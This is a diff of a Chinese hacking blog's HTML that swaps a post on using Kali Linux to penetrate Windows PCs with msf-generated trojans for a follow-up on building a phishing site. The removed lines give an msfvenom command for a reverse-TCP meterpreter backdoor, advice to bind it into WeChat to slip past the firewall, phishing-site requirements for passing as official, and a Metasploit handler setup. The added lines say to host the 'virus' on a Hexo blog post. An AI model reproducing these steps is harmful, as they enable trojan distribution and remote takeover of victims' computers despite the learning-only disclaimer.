@@ -3,20 +3,20 @@
 <html class="use-serif article-header-style-default">
 <head>
 	
-	<title>如何使用KaliLinux渗透Windows电脑#1.msf生成木马渗透篇 - BFH&#39;s Blog</title>
+	<title>如何使用KaliLinux渗透Windows电脑#2.制作钓鱼站点 - BFH&#39;s Blog</title>
 	<meta charset="utf-8">
 	
 		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 	
-	<meta name="description" content="免责声明 本教程仅供参考和学习，不得用于任何犯法。否则博主一概不负责任！ 渗透前准备 下载并安装Kali Linux 到这个网站下载Kali Linux 选择64.bit版本 安装Kali Linux 安装就不用博主说了吧。网上有教程！ 配置KaliLinux 2020年的Kali Linux是不能直接使用root身份进入系统的。 解决方案是： 1.打开Bash Shell 2.输入以下代码： s">
+	<meta name="description" content="免责声明 本教程仅供参考和学习，不得用于任何犯法。否则博主一概不负责任！  前情提要大家看了我上一期写的文章“如何使用KaliLinux渗透Windows电脑#1.msf生成木马渗透篇”吧。本期就是上一期钓鱼网站的补充！！！ 用Hexo博客制作创建Hexo博客 先安装Node.js，然后在博客的根目录下打开终端，输入： $ npm install -g hexo-cli $ npm install">
 <meta property="og:type" content="article">
-<meta property="og:title" content="如何使用KaliLinux渗透Windows电脑#1.msf生成木马渗透篇">
-<meta property="og:url" content="http://black-fruit.github.io/2021/02/18/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8KaliLinux%E6%B8%97%E9%80%8FWindows%E7%94%B5%E8%84%91/index.html">
+<meta property="og:title" content="如何使用KaliLinux渗透Windows电脑#2.制作钓鱼站点">
+<meta property="og:url" content="http://black-fruit.github.io/2021/03/18/kali-msf-2/index.html">
 <meta property="og:site_name" content="BFH&#39;s Blog">
-<meta property="og:description" content="免责声明 本教程仅供参考和学习，不得用于任何犯法。否则博主一概不负责任！ 渗透前准备 下载并安装Kali Linux 到这个网站下载Kali Linux 选择64.bit版本 安装Kali Linux 安装就不用博主说了吧。网上有教程！ 配置KaliLinux 2020年的Kali Linux是不能直接使用root身份进入系统的。 解决方案是： 1.打开Bash Shell 2.输入以下代码： s">
+<meta property="og:description" content="免责声明 本教程仅供参考和学习，不得用于任何犯法。否则博主一概不负责任！  前情提要大家看了我上一期写的文章“如何使用KaliLinux渗透Windows电脑#1.msf生成木马渗透篇”吧。本期就是上一期钓鱼网站的补充！！！ 用Hexo博客制作创建Hexo博客 先安装Node.js，然后在博客的根目录下打开终端，输入： $ npm install -g hexo-cli $ npm install">
 <meta property="og:locale" content="ja_JP">
-<meta property="article:published_time" content="2021-02-18T09:43:38.000Z">
-<meta property="article:modified_time" content="2021-03-20T13:51:01.139Z">
+<meta property="article:published_time" content="2021-03-18T04:23:05.000Z">
+<meta property="article:modified_time" content="2021-03-28T06:05:58.910Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="Kali Linux">
 <meta name="twitter:card" content="summary">
@@ -689,13 +689,13 @@
 	<article class="post post-full card bg-white shadow-sm border-0 post-preview">
 	<header class="post-header text-center">
 		
-		<a class="post-title" href="/2021/02/18/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8KaliLinux%E6%B8%97%E9%80%8FWindows%E7%94%B5%E8%84%91/">如何使用KaliLinux渗透Windows电脑#1.msf生成木马渗透篇</a>
+		<a class="post-title" href="/2021/03/18/kali-msf-2/">如何使用KaliLinux渗透Windows电脑#2.制作钓鱼站点</a>
 		<div class="post-meta">
 			
 						
 						<div class="post-meta-detail post-meta-detail-time">
 							<i class="fa fa-clock-o" aria-hidden="true"></i>
-							<time title="发布于 2021-2-18 17:43:38 | 编辑于 2021-3-20 21:51:01">2021-2-18 17:43
+							<time title="发布于 2021-3-18 12:23:05 | 编辑于 2021-3-28 14:05:58">2021-3-18 12:23
 							</time>
 						</div>
 					
@@ -722,7 +722,7 @@
 						
 						<div class="post-meta-detail post-meta-detail-words">
 							<i class="fa fa-file-word-o" aria-hidden="true"></i>
-							178 字
+							55 字
 						</div>
 					
 						
@@ -740,55 +740,22 @@
 	<div class="post-content" id="post_content">
 		<h1>免责声明</h1>
 <p>本教程仅供参考和学习，不得用于任何犯法。否则博主一概不负责任！</p>
-<h1>渗透前准备</h1>
-<h2>下载并安装Kali Linux</h2>
-<p>到<a href="https://www.kali.org/" target="_blank" rel="external nofollow ugc" color:"#f1f1f1"="">这个网站</a>下载Kali Linux</p>
-<p>选择64.bit版本</p>
-<h2>安装Kali Linux</h2>
-<p>安装就不用博主说了吧。网上有教程！</p>
-<h2>配置KaliLinux</h2>
-2020年的Kali Linux是不能直接使用<code>root</code>身份进入系统的。
-<p>解决方案是：</p>
-1.打开<code>Bash Shell</code>
-2.输入以下代码：
-<pre><code>sudo passwd root
-su root
+
+<h1 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h1><p>大家看了我上一期写的文章“如何使用KaliLinux渗透Windows电脑#1.msf生成木马渗透篇”吧。<br>本期就是上一期钓鱼网站的补充！！！</p>
+<h1 id="用Hexo博客制作"><a href="#用Hexo博客制作" class="headerlink" title="用Hexo博客制作"></a>用Hexo博客制作</h1><h2>创建Hexo博客</h2>
+先安装Node.js，然后在博客的根目录下打开终端，输入：
+<pre><code>$ npm install -g hexo-cli
+$ npm install hexo
+$ hexo init < youfliename >
+$ cd < youfliename >
+$ npm install
 </code></pre>
-<h2>目标靶机2个</h2>
-<p>自己安装即可</p>
-<h1>开始渗透</h1>
-<h2>1.生成木马文件</h2>
-在<code>Bash Shell</code>中输入：
-<pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.xxx.xx.11 lport=2333 -f exe -o my_back-door.exe
-</code></pre>
-<h2>木马捆绑</h2>
-<p>这时，你会发现Windows的防火墙会删除它。没关系，把它放到靶机1里，用文件捆绑捆绑在WeChat里。</p>
-捆绑软件在这里<a href="http://www.xitongzhijia.net/soft/86960.html/" target="_blank" rel="external nofollow ugc" color:"#f1f1f1"="">下载</a>
-<h2>生成钓鱼网站</h2>
-<p>以我的Blog为例，钓鱼网站要求如下：</p>
-<pre><code>必须有钓鱼软件下载按钮
-打官方的称号
-能被搜索到
-https协议
-界面像官方
-因为是靶机所以直接 http://localhost:8000 即可
-</code></pre>
-<h2>得到控制权限，开始攻击</h2>
-<h3>启动msf</h3>
-<pre><code>msfconsole
-</code></pre>
-<h3>设置msf</h3>
-<pre><code>use exploit/multi/handler
-set payload windows/meterpreter/reverse_tcp
-set lhost 10.xxx.xx.xx
-set lport 2333
-</code></pre>
-<h3>发起会话</h3>
-<pre><code>exploit  //.第一种方法
-run      //.第二种方法
-</code></pre>
-<h2>大功告成</h2>
-<p>为了让远程连接不中断，要启动多个终端同时攻击</p>
+<h2>投放</h2>
+新建文章然后把病毒放上去就可以了！
+
+
+
+
 
 	</div>
 
@@ -848,7 +815,7 @@ run      //.第二种方法
 				<span class="btn-inner--icon"><i class="fa fa-twitter"></i></span>
 			</button>
 		</a>
-		<a target="_blank" class="no-pjax icon-telegram" href="https://telegram.me/share/url?url=http://black-fruit.github.io/2021/02/18/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8KaliLinux%E6%B8%97%E9%80%8FWindows%E7%94%B5%E8%84%91/&text=如何使用KaliLinux渗透Windows电脑#1.msf生成木马渗透篇" tooltip="分享到 Telegram">
+		<a target="_blank" class="no-pjax icon-telegram" href="https://telegram.me/share/url?url=http://black-fruit.github.io/2021/03/18/kali-msf-2/&text=如何使用KaliLinux渗透Windows电脑#2.制作钓鱼站点" tooltip="分享到 Telegram">
 			<button class="btn btn-icon btn-primary" style="background: #42a5f5;border: none;">
 				<span class="btn-inner--icon"><i class="fa fa-telegram"></i></span>
 			</button>
@@ -865,14 +832,14 @@ run      //.第二种方法
 </div>
 <script type="text/javascript">
 	socialShare("#share", {
-	    title : '如何使用KaliLinux渗透Windows电脑#1.msf生成木马渗透篇',
+	    title : '如何使用KaliLinux渗透Windows电脑#2.制作钓鱼站点',
 	    description : '免责声明
 本教程仅供参考和学习，不得用于任何犯法。否则博主一概不负责任！
-渗透前准备
-下载并安装Ka...',
+
+前情提要大家看了我上一期...',
 	    wechatQrcodeTitle : "分享到微信",
 	    wechatQrcodeHelper : '微信扫描二维码',
-	    source : 'http://black-fruit.github.io/2021/02/18/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8KaliLinux%E6%B8%97%E9%80%8FWindows%E7%94%B5%E8%84%91/'
+	    source : 'http://black-fruit.github.io/2021/03/18/kali-msf-2/'
 	});
 	$("#share_show")[0].onclick = function(){
 		$("#share_container").addClass("opened");
